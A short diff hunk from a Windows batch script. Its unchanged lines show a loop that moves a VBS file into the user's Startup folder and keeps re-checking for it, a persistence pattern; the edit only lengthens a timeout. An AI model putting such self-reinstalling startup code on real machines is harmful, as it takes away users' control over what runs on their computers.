@@ -15,7 +15,7 @@
          echo Loop >> "%temp%\start.vbs"
          move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" 
     ) 
-    timeout /t 7 /nobreak >nul
+    timeout /t 15 /nobreak >nul
     goto check_start_vbs
 timeout /t 300 /nobreak >nul
 goto loop
